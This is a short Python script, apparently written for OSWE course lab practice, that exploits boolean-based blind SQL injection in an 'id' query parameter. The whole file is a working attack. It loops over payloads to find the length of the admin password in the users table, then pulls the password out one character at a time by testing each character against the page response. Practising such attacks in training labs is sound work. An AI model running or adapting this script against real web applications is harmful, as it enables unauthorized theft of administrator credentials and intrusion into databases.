import requests
import sys
import string
def exploit(target):
	url=target
	print(f"[+] {url} is or target")
	for i in range(1,50):
		payload=f"1 AND LENGTH((SELECT password FROM users WHERE username='admin'))={i}"
		params={'id':payload}
		response=requests.get(url,params=params)
		if "OSWE Course Guide" in response.text:
			print(response.text)
			print(f"[+] Length of the password is {i}")
			break
	charset=string.ascii_letters+string.digits+"{}_-@!?"
	password=""
	for j in range(1,i+1):
		for c in charset:
			payload=f"1 AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),{j},1)) = {ord(c)}"
			params={'id':payload}
			response=requests.get(url,params=params)
			if "OSWE Course Guide" in response.text:
				password+=c
				sys.stdout.write(f"{c}")
				sys.stdout.flush()
	print('')
	print(f"[+] Password is {password}")
	print("[!] Done :)")
if __name__ == '__main__':
	if len(sys.argv) != 2:
		print(f"[+] Usage python3 {sys.argv} http://localhost/index.php")
		sys.exit(1)
	url=sys.argv[1]
	exploit(url)
